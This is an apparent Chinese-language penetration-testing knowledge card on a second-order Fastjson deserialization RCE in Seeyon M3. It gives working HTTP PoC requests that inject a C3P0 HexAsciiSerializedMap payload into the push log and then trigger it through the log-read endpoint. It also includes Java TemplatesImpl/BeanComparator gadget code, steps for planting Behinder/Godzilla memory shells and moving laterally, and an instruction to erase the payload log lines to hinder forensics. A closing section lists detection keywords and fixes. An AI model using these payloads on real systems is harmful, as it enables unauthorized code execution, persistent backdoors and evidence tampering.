---
id: web-java-component-seeyon-m3-pns-log-injection-fastjson-rce
title: 致远 M3 前台日志注入二阶 Fastjson RCE：推送接口把 userMessageId 写进 app.log，日志读取接口反序列化触发 C3P0/TemplatesImpl
type: scenario
domain: web
path: web/java/component
technique: seeyon-m3-pns-log-injection-fastjson-deserialization
tags:
- seeyon
- m3
- java
- fastjson
- log-injection
- second-order
- deserialization
- c3p0
- templatesimpl
- rce
- pentest
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V649
  verified_at: '2026-11-13T04:12:28+08:00'
  notes: 已对照原文与图01-13核对：sendMessages→M3PushMessageTask→AsynchronizedSendTask.run→sendMessageByV61sp1(baidu)→BaiduPushPublisher.push→sendAndroidMessage 的 logger.info(userMessageId) 写入链、loadLog 的 /logs_pns 路径拼接、C3P0 HexAsciiSerializedMap 与 JMG 内存马均一致。修正 4 处：1) 图10 截图显示 setLogList 实际调用 JSONUtil.parseJSONString(message.trim(), PushMessage.class)，顶层 @type 仍被 fastjson 处理（调用栈 Fastjson_ASM_PushMessage_1→Fastjson_ASM_WrapperConnectionPoolDataSource_8），原文'指定类不能触发'表述与其截图/栈矛盾，卡片按证据改写；2) 触发条件 deviceFirm 应为与 Firm.OTHER 名称匹配（图07 为 !equals→return 101），原写'非 OTHER'方向相反，已改；3) PoC 的 userMessageId 末尾补上原文的 | 分隔符（配合 lastIndexOf 截取），并说明作用；4) 防御建议不再推荐仅改为 parseObject(str, class)，改为 safeMode/关 autoType。未验证点：PoC 未执行；原文无 CVE 编号与受影响版本区间，affected_versions 保持省略。
url: /docs/web/java/component/web-java-component-seeyon-m3-pns-log-injection-fastjson-rce/
draft: false
kb_aliases:
- 致远 M3 RCE
- seeyon mobile_portal Fastjson
- /message/send/batch/6_1sp1
- /systemLog/pns/loadLog/app.log
- 日志注入 Fastjson
- M3PushMessageTask
- setLogList 反序列化
---

## 一句话结论

致远 M3 移动办公的推送接口 `/mobile_portal/api/pns/message/send/batch/6_1sp1` 会把消息里的 `userMessageId` 原样写进 `logs_pns/app.log`，而日志读取接口 `/mobile_portal/api/systemLog/pns/loadLog/app.log` 又把日志行当 JSON 交给 fastjson 解析；把带 `@type` 的 fastjson payload 放进 `userMessageId`，先"写日志"再"读日志"，即可在服务端触发反序列化（C3P0 `HexAsciiSerializedMap` 二次反序列化 + TemplatesImpl 字节码）拿到 RCE。

## 原理

- **第一步：可控数据进日志**。`sendMessages(List<M3PushMessage>)` 接收 JSON 数组，交给 `M3PushMessageTask` 异步处理；`sendMessageByV61sp1` 按 `serviceProvider` 选择推送通道（`baidu` → `BaiduPushPublisher`），再按 `deviceType` 分支（`androidphone` → `sendAndroidMessage`）。该方法无论推送成功与否都会执行 `logger.info(userMessageId + " [baidu][android] : true/false")`，`userMessageId` 未经任何转义/过滤直接进入日志文件 `logs_pns/app.log`。
- **第二步：日志内容被反序列化**。`/mobile_portal/api/systemLog/pns/loadLog/{fileName}` 把文件名拼到 `logs_pns` 真实路径后读取文件，`setLogList` 逐行按 `#`/`|` 拆分：message 取 `substring(indexOf("|")+1, lastIndexOf("|"))`，再调用 `JSONUtil.parseJSONString(message.trim(), PushMessage.class)`（图 10 截图原文）。payload 末尾带 `|` 正是为了让 `lastIndexOf("|")` 落在 payload 内、截出完整 JSON，丢掉其后的日志后缀。虽然这里指定了目标类 `PushMessage`，fastjson 反序列化该对象时仍会处理顶层 `@type`（autoType 生效），调用栈可见 `Fastjson_ASM_PushMessage_1.deserialze → ASMJavaBeanDeserializer → JavaBeanDeserializer.deserialze:249 → Fastjson_ASM_WrapperConnectionPoolDataSource_8.deserialze`，实际反序列化类被换成 C3P0。原文正文另有“`JSON.parseObject(jsonString,PushMessage.class)` 这种是不能触发Fastjson的”一句，与其截图代码和调用栈自相矛盾，卡片以截图与调用栈为准。
- **为什么 C3P0 能二次反序列化**：`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setUserOverridesAsString` 接收 `HexAsciiSerializedMap:<hex>`，C3P0 把十六进制还原为原生序列化字节流并 `readObject`；payload 里先放一个 `{"@type":"java.lang.Class","val":"...WrapperConnectionPoolDataSource"}` 把类写入 fastjson 类缓存（1.2.47 缓存绕过思路），第二个对象再引用该类设置属性。
- **原生流里的 gadget**：`PriorityQueue` + `BeanComparator("outputProperties")` 触发 `TemplatesImpl.toString()` → `newTransformer()` → 定义 translet 字节码；translet 的构造器/静态块执行命令或注册 Filter 内存马。`Queue` 需要元素为同一对象两次以满足比较逻辑，外层 JSON 还需要包一层 `[]`（接口参数是 List）。
- **利用面**：两个接口都在"前台"（不需要登录后台管理），写入点还会把任何字符串写进日志；即使目标 fastjson 版本已修复直接入口，只要日志解析仍会处理 `@type`（autoType/缓存绕过可用），二阶注入就成立。WAF 侧可用 `\uXXXX` 转义 `@type`/属性名（JSON 解析器会还原）。

## 触发条件

- 目标部署致远 M3 移动办公，存在 `/mobile_portal/api/pns/message/send/batch/6_1sp1` 与 `/mobile_portal/api/systemLog/pns/loadLog/{file}` 接口。
- 推送服务开启（`pns.server.enable=true`，否则接口返回 "No push service turned on"）。
- 日志读取接口用 fastjson 解析日志（图 10 指定了 `PushMessage.class`，但顶层 `@type` 仍会被 autoType 处理）；目标 fastjson 版本存在 AutoType 绕过（如 `java.lang.Class` 缓存链）；classpath 含 c3p0 与可用的 TemplatesImpl gadget 依赖（JDK 8 环境常见）。
- 攻击者能触发一次推送日志写入（`serviceProvider=baidu`、`deviceType=androidphone`、`deviceFirm` 与 `Firm.OTHER.getNme()` 匹配——原文 PoC 用 `other`；否则 `sendAndroidMessage` 直接 return 101、不写日志），随后访问日志读取接口。

## 利用步骤

1. 生成恶意 translet 字节码（如实现 `AbstractTranslet` 在构造器执行命令，或用 JMG/JMemshell Generator 生成冰蝎/哥斯拉内存马的 BASE64/字节码）。
2. 用 Java 序列化构造器生成 `TemplatesImpl`（设置 `_bytecodes`、`_name`、`_tfactory`），套 `PriorityQueue`+`BeanComparator("outputProperties")` 触发链，序列化成字节并转十六进制。
3. 拼 fastjson payload：先 `java.lang.Class` 缓存 `WrapperConnectionPoolDataSource`，再设置 `userOverridesAsString=HexAsciiSerializedMap:<hex>;`；整体作为字符串放进 `userMessageId`，字符串末尾再加一个 `|`（配合 setLogList 的 `lastIndexOf("|")` 截取完整 JSON），外层用 `[{...}]` 数组（字段包含 `channelId/title/content/deviceType:"androidphone"/serviceProvider:"baidu"/deviceFirm:"other"`）。
4. POST 到 `/mobile_portal/api/pns/message/send/batch/6_1sp1`（`Content-Type: application/json`），等待异步任务把 payload 写入 `logs_pns/app.log`。
5. GET `/mobile_portal/api/systemLog/pns/loadLog/app.log`，服务端解析日志时触发反序列化：命令执行/内存马注册（可先用 DNSLog/`ping` 验证）。
6. 若打内存马，按生成器给出的密码/路径连接（如冰蝎 Filter/Listener 内存马），再执行命令、横向。
7. 清理：删除/覆盖日志中的 payload 行，避免二次触发与取证。

## PoC

```http
POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1
Host: <target>
Content-Type: application/json

[{"userMessageId":"{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:<hex>;\"}|","channelId":"111","title":"111","content":"222","deviceType":"androidphone","serviceProvider":"baidu","deviceFirm":"other"}]
```

```http
GET /mobile_portal/api/systemLog/pns/loadLog/app.log HTTP/1.1
Host: <target>
```

```json
// 缓存绕过型 payload 结构（外层的 [] 是接口 List 参数要求）
[
  {"userMessageId": "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"b\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:<hex>;\"}}|", "...": "..."}
]
```

```java
// gadget 生成核心（简化）
TemplatesImpl t = new TemplatesImpl();
setFieldValue(t, "_bytecodes", new byte[][]{evilTransletBytes});
setFieldValue(t, "_name", "123");
setFieldValue(t, "_tfactory", new TransformerFactoryImpl());
BeanComparator cmp = new BeanComparator("outputProperties");
PriorityQueue q = new PriorityQueue(2, cmp);
setFieldValue(q, "queue", new Object[]{t, t});
setFieldValue(q, "size", 2);
// 序列化 q -> hex -> HexAsciiSerializedMap:<hex>;
```

## 变体与关联

- 变体：写入点不止 `userMessageId`，任何被 logger 拼进日志且读取端会解析的字段（title/content/channelId）都可能成为注入载体，取决于日志格式与 setLogList 的取值逻辑。
- 变体：读取端若按文件名参数穿越（`fileName=../../`）还能读其他文件，与日志注入组合可扩大影响（原文接口按 `{fileName}` 拼接 `logs_pns` 路径）。
- 变体：gadget 可替换为其他 fastjson 链（JNDI、H2 等），取决于目标 classpath；内存马可用 Filter/Listener/Servlet 形态。
- 关联：[[web-java-deser-fastjson-1247-c3p0-templatesimpl-memshell]]（C3P0 HexAsciiSerializedMap + TemplatesImpl 内存马的通用机制）；[[web-java-component-yunxiabox-authservice-config-fastjson-c3p0-hex-rce]]（另一产品的同类 C3P0 链）；[[web-java-component-seeyon-ajaxdo-formulamanager-groovy-file-write-jsp]]（同产品其他 RCE 入口）。

## 检测与防御

- 检测：`/mobile_portal/api/pns/message/send/batch/6_1sp1` 请求的 `userMessageId` 含 `@type`、`c3p0`、`HexAsciiSerializedMap`、`TemplatesImpl` 等关键字（含 Unicode 转义形式）；随后紧接 `/systemLog/pns/loadLog/` 访问。
- 检测：`logs_pns/app.log` 中出现 JSON/Java 序列化特征内容；日志读取接口触发 fastjson 告警/异常栈（`BeanComparator`、`PriorityQueue.readObject`）。
- 检测：Java 进程加载异常 translet/内存马类、出站 DNS/HTTP 验证请求。
- 修复：升级致远 M3 至官方修复版本；日志解析端开启 fastjson safeMode/关闭 autoType 并做类型白名单（仅改成 `JSON.parseObject(str, 具体类.class)` 不足以防御——本文截图恰为该写法仍被顶层 `@type` 覆盖）；对写日志字段做转义与长度限制。
- 加固：fastjson 升级并开启 safeMode；对写日志字段做转义与长度限制；推送/日志接口增加认证与鉴权；WAF 还原 Unicode 转义后检测；日志查看器与日志写入隔离权限。

## 备注

原文为 2023 年护网披露的致远 M3 前台漏洞分析：先通过 `/message/send/batch/6_1sp1` 把 payload 存入 `logs_pns/app.log`（`serviceProvider=baidu`、`deviceType=androidphone` 分支的 `logger.info(userMessageId...)`），再通过 `/systemLog/pns/loadLog/app.log` 的 `setLogList` → `JSONUtil.parseJSONString(message.trim(), PushMessage.class)`（图 10；顶层 @type 仍被 fastjson 处理，调用栈为 Fastjson_ASM_PushMessage_1 → Fastjson_ASM_WrapperConnectionPoolDataSource_8）触发 fastjson；利用 C3P0 `userOverridesAsString` + `HexAsciiSerializedMap` 二次反序列化，CB 链 `PriorityQueue/BeanComparator` 打 `TemplatesImpl` 字节码；文中给出完整 Java 生成代码、Unicode 转义 POC（userMessageId 末尾带 `|` 分隔符）与 JMG 内存马（图 01-13）。原文未标注受影响版本区间，affected_versions 省略。PoC 未执行。
